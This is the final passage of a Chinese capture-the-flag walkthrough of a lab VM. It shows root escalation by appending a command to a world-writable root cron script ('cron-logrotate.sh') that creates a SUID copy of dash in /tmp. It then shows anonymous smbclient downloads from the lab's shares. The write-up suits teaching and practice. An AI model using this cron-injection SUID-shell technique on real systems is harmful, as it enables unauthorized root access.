### 3、计划任务+可写文件提权-方法3

在内网信息枚举的时候发现可写入sh文件漏洞利用：

    
    
    [+] .sh files in path
    [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
    You can write script: /usr/local/sbin/cron-logrotate.sh
    

**1）查找和logrotate相关的文件信息**

利用find全局枚举该文件信息：

    
    
    find / -name logrotate* 2>/dev/null  
    

![1650114221_625abeadb0bf33e98b1b5.png!small?1650114222420](https://image.3001.net/images/20220416/1650114221_625abeadb0bf33e98b1b5.png!small?1650114222420)  
发现/etc/cron.d/logrotate文件！

 **2）查看/etc/cron.d/logrotate文件**

![1650114226_625abeb2b93cb98d2b17f.png!small?1650114226891](https://image.3001.net/images/20220416/1650114226_625abeb2b93cb98d2b17f.png!small?1650114226891)

    
    
    cat /etc/cron.d/logrotate
    */5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
    

可看到每五分钟运行一次cron-logrotate.sh！

 **3）写入dash代码**

    
    
    echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit" >> /usr/local/sbin/cron-logrotate.sh
    cat /usr/local/sbin/cron-logrotate.sh
    

![1650114230_625abeb6dfc5308eaa364.png!small?1650114231613](https://image.3001.net/images/20220416/1650114230_625abeb6dfc5308eaa364.png!small?1650114231613)  
通过写入代码内容为，复制dash到tmp目录下并赋予最高权限！在tmp目录下生成了exploit可执行文件！

 **4）运行exploit，获得root权限**

    
    
    /tmp/exploit -p
    

因为写入的是dash，用-p获取root  
![1650114235_625abebb364ec2d4fa79d.png!small?1650114235430](https://image.3001.net/images/20220416/1650114235_625abebb364ec2d4fa79d.png!small?1650114235430)  
获得root权限！获得flag：

    
    
    cd /root
    cat flag.txt
    

![1650114238_625abebeac6cb044f6788.png!small?1650114239090](https://image.3001.net/images/20220416/1650114238_625abebeac6cb044f6788.png!small?1650114239090)  
获得flag信息！

## 八、知识拓展小技巧

 **smbclient连接共享小技巧**

Linux smbclient命令可存取SMB/CIFS服务器的用户端程序。  
SMB与CIFS为服务器通信协议，常用于Windows95/98/NT等系统。smbclient(samba
client)可让Linux系统存取Windows系统所分享的资源。

![1650114244_625abec45ca11a8b0f189.png!small?1650114244822](https://image.3001.net/images/20220416/1650114244_625abec45ca11a8b0f189.png!small?1650114244822)

    
    
    smbclient -L //192.168.40.152
    -L 显示服务器端所分享出来的所有资源
    

之前已知kathy和tmp是开放的！

 **1）连接这2个文件夹**

 **连接kathy文件夹：**

    
    
    smbclient ///kathy -I 192.168.40.152 -N
    
    -I<IP地址> 指定服务器的IP地址
    -N 不用询问密码
    
    cd kathy_stuff
    get todo-list.txt
    cd backup
    get vsftpd.conf
    get wordpress-4.tar.gz
    

![1650114250_625abeca80bb4571ad9a3.png!small?1650114251583](https://image.3001.net/images/20220416/1650114250_625abeca80bb4571ad9a3.png!small?1650114251583)  
通过命令连接后发现三个文件信息都成功下载！

 **连接tmp文件夹：**

连接tmp文件夹，下载文件ls至本地

    
    
    smbclient ///tmp -I 192.168.40.152 -N
    get ls
    

![1650114254_625abecea812970bea686.png!small?1650114255166](https://image.3001.net/images/20220416/1650114254_625abecea812970bea686.png!small?1650114255166)  
通过命令连接后发现文件信息都成功下载！

 **2）枚举文件信息**

![1650114258_625abed2d0bc22fb2cf85.png!small?1650114259577](https://image.3001.net/images/20220416/1650114258_625abed2d0bc22fb2cf85.png!small?1650114259577)  
成功下载4个文件后，通过阅读查看均无可用信息！

## 九、总结

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、FTP信息枚举、Samba信息收集、暴力破解ssh信息枚举、nc信息枚举666端口、枚举12380端口信息收集、Wpscan信息收集、39646
exp利用、Mysql信息枚举、John暴力破解、php-webshell文件上传利用、weevely文件上传利用、webacoo文件上传利用、Msfconsole文件上传上线webshell、mysql INTO
OUT文件上传攻陷服务器、Linpeas信息枚举、内核提权、SSH-sudo登录内核提权、计划任务+可写文件提权等等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

希望大家提高安全意识，没有网络安全就没有国家安全！

